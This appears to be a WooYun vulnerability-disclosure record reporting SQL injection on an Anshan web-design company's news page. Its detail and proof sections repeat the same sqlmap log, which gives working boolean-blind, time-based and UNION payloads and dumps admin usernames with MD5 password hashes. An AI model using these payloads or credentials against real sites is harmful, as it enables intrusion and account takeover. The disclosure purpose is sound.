{"id": 80045, "wybug_id": "wooyun-2015-0156774", "wybug_title": "鞍山市瀛海威信息技术有限公司SQL注入", "wybug_corp": "鞍山市瀛海威信息技术有限公司", "wybug_author": "小殊", "wybug_date": "2015-12-01 16:04", "wybug_open_date": "2016-01-18 14:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向公众公开  简要描述： 鞍山网站建设_鞍山网络公司_鞍山网站制作_鞍山广告传媒_鞍山微信平台_鞍山短信群发_鞍山手机网站_鞍山供应链管理_鞍山监控系统_鞍山APP制作_鞍山市瀛海威信息技术有限公司-------------------------------------------------------------------------------------------案例展示中：9页，每页12个站差不多都存在注入（和帮别人搭建的站点） 详细说明：  root@attack:~# sqlmap -u \"http://**.**.**.**/newsPage.php?nsId=161\"         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150918}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 00:59:50[00:59:51] [INFO] testing connection to the target URL[00:59:53] [INFO] testing if the target URL is stable[00:59:53] [INFO] target URL is stable[00:59:53] [INFO] testing if GET parameter 'nsId' is dynamic[00:59:54] [INFO] confirming that GET parameter 'nsId' is dynamic[00:59:55] [WARNING] GET parameter 'nsId' does not appear dynamic[00:59:56] [INFO] heuristic (basic) test shows that GET parameter 'nsId' might be injectable (possible DBMS: 'MySQL')[00:59:56] [INFO] testing for SQL injection on GET parameter 'nsId'it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [00:59:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[01:00:09] [INFO] GET parameter 'nsId' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable [01:00:09] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[01:00:10] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[01:00:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'[01:00:12] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'[01:00:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'[01:00:14] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'[01:00:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'[01:00:16] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)'[01:00:16] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[01:00:17] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING clause'[01:00:20] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'[01:00:22] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'[01:00:23] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[01:00:23] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'[01:00:24] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'[01:00:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'[01:00:25] [INFO] testing 'MySQL inline queries'[01:00:26] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'[01:00:26] [WARNING] time-based comparison requires larger statistical model, please wait..[01:00:30] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[01:00:32] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT)'[01:00:33] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'[01:00:34] [INFO] testing 'MySQL > 5.0.11 stacked queries'[01:00:35] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'[01:00:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[01:00:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'[01:00:47] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SELECT)'[01:00:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)'[01:01:21] [INFO] GET parameter 'nsId' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)' injectable [01:01:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[01:01:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[01:01:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[01:01:30] [INFO] target URL appears to have 13 columns in query[01:01:45] [WARNING] combined UNION/error-based SQL injection case found on column 9. sqlmap will try to find another column with better characteristics[01:01:52] [WARNING] combined UNION/error-based SQL injection case found on column 8. sqlmap will try to find another column with better characteristics[01:01:54] [WARNING] combined UNION/error-based SQL injection case found on column 2. sqlmap will try to find another column with better characteristics[01:01:57] [WARNING] combined UNION/error-based SQL injection case found on column 10. sqlmap will try to find another column with better characteristics[01:01:59] [WARNING] combined UNION/error-based SQL injection case found on column 4. sqlmap will try to find another column with better characteristics[01:01:59] [INFO] GET parameter 'nsId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectableGET parameter 'nsId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:---Parameter: nsId (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: nsId=161 AND 3347=3347    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: nsId=161 AND (SELECT * FROM (SELECT(SLEEP(5)))Vzhz)#    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: nsId=-4154 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x67465254664359764d50,0x717a717a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---[01:05:59] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, PHP 5.3.27back-end DBMS: MySQL 5.0.12[01:05:59] [INFO] fetched data logged to text files under '/root/.sqlmap/output/**.**.**.**'----------------------------------------------------------------------------------------------------------------------------------------------------------current database:    'db_21anshan'------------------------------------------------------------------Database: db_21anshan                                                          [5 tables]+--------------+| dczj_admin   || dczj_newsimg || yhw_admin    || yhw_ask      || yhw_news     |+--------------+  ---------------------------------------------------------------------------------------------------Database: db_21anshan                                                          Table: dczj_admin[4 columns]+--------+-------------+| Column | Type        |+--------+-------------+| adId   | int(11)     || adName | varchar(50) || adPwd  | varchar(50) || adSale | varchar(50) |+--------+-------------+-------------------------------------------------------------------------------------------Database: db_21anshanTable: dczj_admin[2 entries]+----------+----------------------------------+| adName   | adPwd                            |+----------+----------------------------------+| admin    | 09e05ba1fa0f0dadaaacfd339c283b19 || 21anshan | bfb1061f2f4340b0457b295f87262e12 |+----------+----------------------------------+----------------------------------------------------------------------------------------------------------\n\n   漏洞证明：  root@attack:~# sqlmap -u \"http://**.**.**.**/newsPage.php?nsId=161\"         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150918}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 00:59:50[00:59:51] [INFO] testing connection to the target URL[00:59:53] [INFO] testing if the target URL is stable[00:59:53] [INFO] target URL is stable[00:59:53] [INFO] testing if GET parameter 'nsId' is dynamic[00:59:54] [INFO] confirming that GET parameter 'nsId' is dynamic[00:59:55] [WARNING] GET parameter 'nsId' does not appear dynamic[00:59:56] [INFO] heuristic (basic) test shows that GET parameter 'nsId' might be injectable (possible DBMS: 'MySQL')[00:59:56] [INFO] testing for SQL injection on GET parameter 'nsId'it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [00:59:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[01:00:09] [INFO] GET parameter 'nsId' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable [01:00:09] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[01:00:10] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[01:00:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'[01:00:12] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'[01:00:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'[01:00:14] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'[01:00:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'[01:00:16] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)'[01:00:16] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[01:00:17] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING clause'[01:00:20] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'[01:00:22] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'[01:00:23] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[01:00:23] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'[01:00:24] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'[01:00:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'[01:00:25] [INFO] testing 'MySQL inline queries'[01:00:26] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'[01:00:26] [WARNING] time-based comparison requires larger statistical model, please wait..[01:00:30] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[01:00:32] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT)'[01:00:33] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'[01:00:34] [INFO] testing 'MySQL > 5.0.11 stacked queries'[01:00:35] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'[01:00:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[01:00:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'[01:00:47] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SELECT)'[01:00:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)'[01:01:21] [INFO] GET parameter 'nsId' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)' injectable [01:01:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[01:01:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[01:01:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[01:01:30] [INFO] target URL appears to have 13 columns in query[01:01:45] [WARNING] combined UNION/error-based SQL injection case found on column 9. sqlmap will try to find another column with better characteristics[01:01:52] [WARNING] combined UNION/error-based SQL injection case found on column 8. sqlmap will try to find another column with better characteristics[01:01:54] [WARNING] combined UNION/error-based SQL injection case found on column 2. sqlmap will try to find another column with better characteristics[01:01:57] [WARNING] combined UNION/error-based SQL injection case found on column 10. sqlmap will try to find another column with better characteristics[01:01:59] [WARNING] combined UNION/error-based SQL injection case found on column 4. sqlmap will try to find another column with better characteristics[01:01:59] [INFO] GET parameter 'nsId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectableGET parameter 'nsId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:---Parameter: nsId (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: nsId=161 AND 3347=3347    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: nsId=161 AND (SELECT * FROM (SELECT(SLEEP(5)))Vzhz)#    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: nsId=-4154 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x67465254664359764d50,0x717a717a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---[01:05:59] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, PHP 5.3.27back-end DBMS: MySQL 5.0.12[01:05:59] [INFO] fetched data logged to text files under '/root/.sqlmap/output/**.**.**.**'   修复方案：  过滤 。建议找个比较安全的cms和把漏洞修复了再用。防止信息泄露    版权声明：转载请注明来源 小殊@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-12-04 13:55 厂商回复： CNVD确认所述漏洞情况，暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}